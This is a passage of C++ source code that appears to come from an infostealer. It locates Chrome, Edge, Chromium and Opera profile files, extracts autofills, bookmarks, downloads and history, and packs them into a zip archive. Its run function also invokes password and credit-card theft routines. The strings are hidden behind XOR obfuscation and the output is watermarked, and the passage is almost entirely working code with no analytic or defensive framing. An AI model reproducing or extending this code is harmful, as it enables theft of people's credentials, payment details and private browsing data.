		if (g_tools.check_directory(opera_web_data.c_str()) == FILE_FOUNDED
			&& g_tools.check_directory(opera_local_state.c_str()) == FILE_FOUNDED) {
			ss << decrypt_chromium_autofills(XOR_STRING("Opera Stable"), opera_web_data.c_str(),
				opera_local_state.c_str());
		}
	}

	ss << std::string(2, ' ') << XOR_STRING(WATERMARK) << XOR_STRING("\r\n");

	if (g_globals.autofill_count < 0)
		return;

	std::string file_name = std::string(XOR_STRING("Browsers/")) + g_tools.autofill_file.c_str();
	g_zip.write_zip(file_name.c_str(), ss.str());
}

void browsers::get_bookmarks()
{
	std::string chrome_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Google\\Chrome\\"));
	std::string microsoft_edge_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Microsoft\\Edge\\"));
	std::string chromium_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Chromium\\"));
	std::string opera_dir = g_dir.get_roaming_appdata() + std::string(XOR_STRING("Opera Software\\Opera Stable\\"));

	std::stringstream ss;

	const char banner[] = {
		0x20, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
		0x20, 0x5F, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20, 0x5F, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x20, 0x20,
		0x7C, 0x20, 0x5F, 0x20, 0x29, 0x20, 0x5F, 0x5F, 0x5F, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x7C, 0x20,
		0x7C, 0x5F, 0x5F, 0x5F, 0x20, 0x5F, 0x5F, 0x20, 0x20, 0x5F, 0x5F, 0x20, 0x5F, 0x20, 0x5F, 0x20,
		0x5F, 0x7C, 0x20, 0x7C, 0x5F, 0x5F, 0x20, 0x5F, 0x5F, 0x5F, 0x0D, 0x0A, 0x20, 0x20, 0x7C, 0x20,
		0x5F, 0x20, 0x5C, 0x2F, 0x20, 0x5F, 0x20, 0x5C, 0x2F, 0x20, 0x5F, 0x20, 0x5C, 0x20, 0x2F, 0x20,
		0x2F, 0x20, 0x27, 0x20, 0x20, 0x5C, 0x2F, 0x20, 0x5F, 0x60, 0x20, 0x7C, 0x20, 0x27, 0x5F, 0x7C,
		0x20, 0x2F, 0x20, 0x2F, 0x28, 0x5F, 0x2D, 0x3C, 0x0D, 0x0A, 0x20, 0x20, 0x7C, 0x5F, 0x5F, 0x5F,
		0x2F, 0x5C, 0x5F, 0x5F, 0x5F, 0x2F, 0x5C, 0x5F, 0x5F, 0x5F, 0x2F, 0x5F, 0x5C, 0x5F, 0x5C, 0x5F,
		0x7C, 0x5F, 0x7C, 0x5F, 0x5C, 0x5F, 0x5F, 0x2C, 0x5F, 0x7C, 0x5F, 0x7C, 0x20, 0x7C, 0x5F, 0x5C,
		0x5F, 0x5C, 0x2F, 0x5F, 0x5F, 0x2F, 0x0D, 0x0A, 0x0D, 0x0A, 0x20, 0x20, 0x42, 0x72, 0x6F, 0x77,
		0x73, 0x65, 0x72, 0x20, 0x6E, 0x61, 0x6D, 0x65, 0x2C, 0x20, 0x4E, 0x61, 0x6D, 0x65, 0x2C, 0x20,
		0x55, 0x72, 0x6C, 0x2C, 0x20, 0x54, 0x79, 0x70, 0x65, 0x0D, 0x0A, 0x20, 0x20, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D
	};

	ss << XOR_STRING("\r\n");
	for (size_t i = 0; i < sizeof(banner) / sizeof(banner[0]); ++i) {
		ss << banner[i];
	}
	ss << XOR_STRING("\r\n");

	if (g_tools.check_directory(chrome_dir.c_str()) == DIR_FOUNDED)
	{
		std::string bookmarks_data = chrome_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\Bookmarks"));
		ss << decrypt_chromium_bookmarks(XOR_STRING("Google Chrome"), bookmarks_data.c_str());
	}

	if (g_tools.check_directory(microsoft_edge_dir.c_str()) == DIR_FOUNDED)
	{
		std::string bookmarks_data = microsoft_edge_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\Bookmarks"));
		ss << decrypt_chromium_bookmarks(XOR_STRING("Microsoft Edge"), bookmarks_data.c_str());
	}

	if (g_tools.check_directory(chromium_dir.c_str()) == DIR_FOUNDED)
	{
		std::string bookmarks_data = chromium_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\Bookmarks"));
		ss << decrypt_chromium_bookmarks(XOR_STRING("Based on Chromium"), bookmarks_data.c_str());
	}

	if (g_tools.check_directory(opera_dir.c_str()) == DIR_FOUNDED)
	{
		std::string bookmarks_data = opera_dir.c_str() + std::string(XOR_STRING("Bookmarks"));
		ss << decrypt_chromium_bookmarks(XOR_STRING("Opera Stable"), bookmarks_data.c_str());
	}

	ss << std::string(2, ' ') << XOR_STRING(WATERMARK) << XOR_STRING("\r\n");

	if (g_globals.bookmarks_count < 0)
		return;

	std::string file_name = std::string(XOR_STRING("Browsers/")) + g_tools.bookmarks_file.c_str();
	g_zip.write_zip(file_name.c_str(), ss.str());
}

void browsers::get_downloads()
{
	std::string chrome_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Google\\Chrome\\"));
	std::string microsoft_edge_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Microsoft\\Edge\\"));
	std::string chromium_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Chromium\\"));
	std::string opera_dir = g_dir.get_roaming_appdata() + std::string(XOR_STRING("Opera Software\\Opera Stable\\"));

	std::stringstream ss;

	const char banner[] = {
			0x20, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
			0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5F, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
			0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5F, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x20, 0x20,
			0x7C, 0x20, 0x20, 0x20, 0x5C, 0x20, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x20, 0x5F, 0x5F, 0x20, 0x5F,
			0x5F, 0x5F, 0x20, 0x5F, 0x20, 0x7C, 0x20, 0x7C, 0x5F, 0x5F, 0x5F, 0x20, 0x20, 0x5F, 0x5F, 0x20,
			0x5F, 0x20, 0x5F, 0x5F, 0x7C, 0x20, 0x7C, 0x5F, 0x5F, 0x5F, 0x0D, 0x0A, 0x20, 0x20, 0x7C, 0x20,
			0x7C, 0x29, 0x20, 0x2F, 0x20, 0x5F, 0x20, 0x5C, 0x20, 0x56, 0x20, 0x20, 0x56, 0x20, 0x2F, 0x20,
			0x27, 0x20, 0x5C, 0x7C, 0x20, 0x2F, 0x20, 0x5F, 0x20, 0x5C, 0x2F, 0x20, 0x5F, 0x60, 0x20, 0x2F,
			0x20, 0x5F, 0x60, 0x20, 0x28, 0x5F, 0x2D, 0x3C, 0x0D, 0x0A, 0x20, 0x20, 0x7C, 0x5F, 0x5F, 0x5F,
			0x2F, 0x5C, 0x5F, 0x5F, 0x5F, 0x2F, 0x5C, 0x5F, 0x2F, 0x5C, 0x5F, 0x2F, 0x7C, 0x5F, 0x7C, 0x7C,
			0x5F, 0x7C, 0x5F, 0x5C, 0x5F, 0x5F, 0x5F, 0x2F, 0x5C, 0x5F, 0x5F, 0x2C, 0x5F, 0x5C, 0x5F, 0x5F,
			0x2C, 0x5F, 0x2F, 0x5F, 0x5F, 0x2F, 0x0D, 0x0A, 0x0D, 0x0A, 0x20, 0x20, 0x42, 0x72, 0x6F, 0x77,
			0x73, 0x65, 0x72, 0x20, 0x6E, 0x61, 0x6D, 0x65, 0x2C, 0x20, 0x50, 0x61, 0x74, 0x68, 0x2C, 0x20,
			0x55, 0x72, 0x6C, 0x0D, 0x0A, 0x20, 0x20, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D
	};

	ss << XOR_STRING("\r\n");
	for (size_t i = 0; i < sizeof(banner) / sizeof(banner[0]); ++i) {
		ss << banner[i];
	}
	ss << XOR_STRING("\r\n");

	if (g_tools.check_directory(chrome_dir.c_str()) == DIR_FOUNDED)
	{
		std::string chrome_history_data = chrome_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\History"));

		if (g_tools.check_directory(chrome_history_data.c_str()) == FILE_FOUNDED) {
			ss << decrypt_chromium_downloads(XOR_STRING("Google Chrome"), chrome_history_data.c_str());
		}
	}

	if (g_tools.check_directory(microsoft_edge_dir.c_str()) == DIR_FOUNDED)
	{
		std::string microsoft_edge_history_data = microsoft_edge_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\History"));

		if (g_tools.check_directory(microsoft_edge_history_data.c_str()) == FILE_FOUNDED) {
			ss << decrypt_chromium_downloads(XOR_STRING("Microsoft Edge"), microsoft_edge_history_data.c_str());
		}
	}

	if (g_tools.check_directory(chromium_dir.c_str()) == DIR_FOUNDED)
	{
		std::string chromium_history_data = chromium_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\History"));

		if (g_tools.check_directory(chromium_history_data.c_str()) == FILE_FOUNDED) {
			ss << decrypt_chromium_downloads(XOR_STRING("Based on Chromium"), chromium_history_data.c_str());
		}
	}

	if (g_tools.check_directory(opera_dir.c_str()) == DIR_FOUNDED)
	{
		std::string opera_history_data = opera_dir.c_str() + std::string(XOR_STRING("History"));

		if (g_tools.check_directory(opera_history_data.c_str()) == FILE_FOUNDED) {
			ss << decrypt_chromium_downloads(XOR_STRING("Based on Chromium"), opera_history_data.c_str());
		}
	}

	ss << std::string(2, ' ') << XOR_STRING(WATERMARK) << XOR_STRING("\r\n");

	if (g_globals.downloads_count < 0)
		return;

	std::string file_name = std::string(XOR_STRING("Browsers/")) + g_tools.downloads_file.c_str();
	g_zip.write_zip(file_name.c_str(), ss.str());
}

void browsers::get_history()
{
	std::string chrome_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Google\\Chrome\\"));
	std::string microsoft_edge_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Microsoft\\Edge\\"));
	std::string chromium_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Chromium\\"));
	std::string opera_dir = g_dir.get_roaming_appdata() + std::string(XOR_STRING("Opera Software\\Opera Stable\\"));

	std::stringstream ss;

	const char banner[] = {
			0x20, 0x20, 0x20, 0x5F, 0x20, 0x20, 0x5F, 0x20, 0x5F, 0x20, 0x20, 0x20, 0x20, 0x5F, 0x20, 0x20,
			0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A,
			0x20, 0x20, 0x7C, 0x20, 0x7C, 0x7C, 0x20, 0x28, 0x5F, 0x29, 0x5F, 0x5F, 0x7C, 0x20, 0x7C, 0x5F,
			0x20, 0x5F, 0x5F, 0x5F, 0x20, 0x5F, 0x20, 0x5F, 0x20, 0x5F, 0x20, 0x20, 0x5F, 0x20, 0x0D, 0x0A,
			0x20, 0x20, 0x7C, 0x20, 0x5F, 0x5F, 0x20, 0x7C, 0x20, 0x28, 0x5F, 0x2D, 0x3C, 0x20, 0x20, 0x5F,
			0x2F, 0x20, 0x5F, 0x20, 0x5C, 0x20, 0x27, 0x5F, 0x7C, 0x20, 0x7C, 0x7C, 0x20, 0x7C, 0x0D, 0x0A,
			0x20, 0x20, 0x7C, 0x5F, 0x7C, 0x7C, 0x5F, 0x7C, 0x5F, 0x2F, 0x5F, 0x5F, 0x2F, 0x5C, 0x5F, 0x5F,
			0x5C, 0x5F, 0x5F, 0x5F, 0x2F, 0x5F, 0x7C, 0x20, 0x20, 0x5C, 0x5F, 0x2C, 0x20, 0x7C, 0x0D, 0x0A,
			0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
			0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7C, 0x5F, 0x5F, 0x2F, 0x20, 0x0D, 0x0A,
			0x0D, 0x0A, 0x20, 0x20, 0x42, 0x72, 0x6F, 0x77, 0x73, 0x65, 0x72, 0x20, 0x6E, 0x61, 0x6D, 0x65,
			0x2C, 0x20, 0x54, 0x69, 0x74, 0x6C, 0x65, 0x2C, 0x20, 0x55, 0x72, 0x6C, 0x0D, 0x0A, 0x20, 0x20,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D
	};

	ss << XOR_STRING("\r\n");
	for (size_t i = 0; i < sizeof(banner) / sizeof(banner[0]); ++i) {
		ss << banner[i];
	}
	ss << XOR_STRING("\r\n");

	if (g_tools.check_directory(chrome_dir.c_str()) == DIR_FOUNDED)
	{
		std::string chrome_history_data = chrome_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\History"));

		if (g_tools.check_directory(chrome_history_data.c_str()) == FILE_FOUNDED) {
			ss << decrypt_chromium_history(XOR_STRING("Google Chrome"), chrome_history_data.c_str());
		}
	}

	if (g_tools.check_directory(microsoft_edge_dir.c_str()) == DIR_FOUNDED)
	{
		std::string microsoft_edge_history_data = microsoft_edge_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\History"));

		if (g_tools.check_directory(microsoft_edge_history_data.c_str()) == FILE_FOUNDED) {
			ss << decrypt_chromium_history(XOR_STRING("Microsoft Edge"), microsoft_edge_history_data.c_str());
		}
	}

	if (g_tools.check_directory(chromium_dir.c_str()) == DIR_FOUNDED)
	{
		std::string chromium_history_data = chromium_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\History"));

		if (g_tools.check_directory(chromium_history_data.c_str()) == FILE_FOUNDED) {
			ss << decrypt_chromium_history(XOR_STRING("Based on Chromium"), chromium_history_data.c_str());
		}
	}

	if (g_tools.check_directory(opera_dir.c_str()) == DIR_FOUNDED)
	{
		std::string opera_history_data = opera_dir.c_str() + std::string(XOR_STRING("History"));

		if (g_tools.check_directory(opera_history_data.c_str()) == FILE_FOUNDED) {
			ss << decrypt_chromium_history(XOR_STRING("Opera Stable"), opera_history_data.c_str());
		}
	}

	ss << std::string(2, ' ') << XOR_STRING(WATERMARK) << XOR_STRING("\r\n");

	if (g_globals.history_count < 0)
		return;

	std::string file_name = std::string(XOR_STRING("Browsers/")) + g_tools.history_file.c_str();
	g_zip.write_zip(file_name.c_str(), ss.str());
}

void browsers::run()
{
	std::thread(&browsers::get_passwords, this).join();
	std::thread(&browsers::get_credit_cards, this).join();
	std::thread(&browsers::get_autofills, this).join();
	std::thread(&browsers::get_bookmarks, this).join();
	std::thread(&browsers::get_downloads, this).join();
	std::thread(&browsers::get_history, this).join();
}